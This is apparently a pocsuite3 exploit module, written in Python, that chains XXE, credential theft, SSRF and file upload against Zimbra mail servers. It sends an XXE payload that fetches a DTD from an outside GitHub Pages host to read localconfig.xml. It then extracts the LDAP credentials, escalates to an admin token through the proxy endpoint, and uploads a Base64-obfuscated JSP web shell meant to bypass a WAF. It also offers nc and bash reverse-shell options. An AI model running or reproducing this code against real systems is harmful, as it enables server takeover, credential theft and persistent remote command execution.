"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict
from pocsuite3.lib.utils import random_str
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class DemoPOC(POCBase):
    vulID = '97866'  # ssvid
    version = '1.0'
    author = ['z3r0yu']
    vulDate = '2018-12-09'
    createDate = '2018-12-10'
    updateDate = '2018-12-10'
    references = ['https://www.seebug.org/vuldb/ssvid-97866']
    name = 'Zimbra <8.5 and  Zimbra from 8.5 to 8.7.11 RCE'
    appPowerLink = 'http://www.test.cn/'
    appName = 'Zimbra'
    appVersion = 'Zimbra 8.x'
    vulType = 'Remote Code Execution'
    desc = '''None'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''攻击模式下将会生成一个一句话shell，成功返回shell地址，shell密码为pass'''

    def _options(self):
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _check(self, url):
        base_url = url.rstrip("/")
        # upload file name and content
        # modify by k8gege
        # Connect "shell.jsp" using K8fly CmdShell
        # Because the CMD parameter is encrypted using Base64(bypass WAF)
        filename = "shell.jsp"
        fileContent = r'<%@page import="java.io.*"%><%@page import="sun.misc.BASE64Decoder"%><%try {String cmd = request.getParameter("tom");String path=application.getRealPath(request.getRequestURI());String dir="weblogic";if(cmd.equals("NzU1Ng")){out.print("[S]"+dir+"[E]");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("->|");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print("|<-");try {child.waitFor();} catch (InterruptedException e) {e.printStackTrace();}} catch (IOException e) {System.err.println(e);}%>'
        print(base_url)
        # dtd file url
        dtd_url = "https://k8gege.github.io/zimbra.dtd"
        """
        <!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
        <!ENTITY % start "<![CDATA[">
        <!ENTITY % end "]]>">
        <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
        """
        xxe_data = r"""<!DOCTYPE Autodiscover [
                <!ENTITY % dtd SYSTEM "{dtd}">
                %dtd;
                %all;
                ]>
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
            <Request>
                <EMailAddress>aaaaa</EMailAddress>
                <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
            </Request>
        </Autodiscover>""".format(dtd=dtd_url)

        # XXE stage
        headers = {
            "Content-Type": "application/xml"
        }
        print("[*] Get User Name/Password By XXE ")
        r = requests.post(base_url+"/Autodiscover/Autodiscover.xml",
                          data=xxe_data, headers=headers, verify=False, timeout=15)
        #print r.text
        if 'response schema not available' not in r.text:
            print("have no xxe")
            exit()
        # low_token Stage
        import re
        pattern_name = re.compile(
            r"&lt;key name=(\"|&quot;)zimbra_user(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
        pattern_password = re.compile(
            r"&lt;key name=(\"|&quot;)zimbra_ldap_password(\"|&quot;)&gt;\n.*?&lt;value&gt;(.*?)&lt;\/value&gt;")
        username = pattern_name.findall(r.text)[0][2]
        password = pattern_password.findall(r.text)[0][2]
        print(username)
        print(password)

        auth_body = """<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
            <context xmlns="urn:zimbra">
                <userAgent name="ZimbraWebClient - SAF3 (Win)" version="5.0.15_GA_2851.RHEL5_64"/>
            </context>
        </soap:Header>
        <soap:Body>
            <AuthRequest xmlns="{xmlns}">
                <account by="adminName">{username}</account>
                <password>{password}</password>
            </AuthRequest>
        </soap:Body>
        </soap:Envelope>
        """
        print("[*] Get Low Privilege Auth Token")
        r = requests.post(base_url+"/service/soap", data=auth_body.format(
            xmlns="urn:zimbraAccount", username=username, password=password), verify=False)

        pattern_auth_token = re.compile(r"<authToken>(.*?)</authToken>")

        low_priv_token = pattern_auth_token.findall(r.text)[0]

        # print(low_priv_token)

        # SSRF+Get Admin_Token Stage
        headers["Cookie"] = "ZM_ADMIN_AUTH_TOKEN="+low_priv_token+";"
        headers["Host"] = "foo:7071"
        print("[*] Get Admin  Auth Token By SSRF")
        r = requests.post(base_url+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap", data=auth_body.format(
            xmlns="urn:zimbraAdmin", username=username, password=password), headers=headers, verify=False)

        print(r.text)
        admin_token = pattern_auth_token.findall(r.text)[0]
        print("ADMIN_TOKEN:"+admin_token)

        f = {
            'filename1': (None, "whocare", None),
            'clientFile': (filename, fileContent, "text/plain"),
            'requestId': (None, "12", None),
        }

        headers = {
            "Cookie": "ZM_ADMIN_AUTH_TOKEN="+admin_token+";"
        }
        print("[*] Uploading file")
        r = requests.post(base_url+"/service/extension/clientUploader/upload",
                          files=f, headers=headers, verify=False)
        # print(r.text)
        print("Shell: "+base_url+"/downloads/"+filename)
        #print("Connect \"shell.jsp\" using K8fly CmdShell\nBecause the CMD parameter is encrypted using Base64(bypass WAF)")
        print("[*] Request Result:")
        s = requests.session()
        r = s.get(base_url+"/downloads/"+filename,
                  verify=False, headers=headers)
        # print(r.text)
        print("May need cookie:")
        print(headers['Cookie'])
        if r.status_code == 200:
            return base_url+"/downloads/"+filename, headers['Cookie']
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Cookie'] = p[1]

        return self.parse_output(result)

    def _attack(self):
        self._verify(self)

    def _shell(self):
        pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
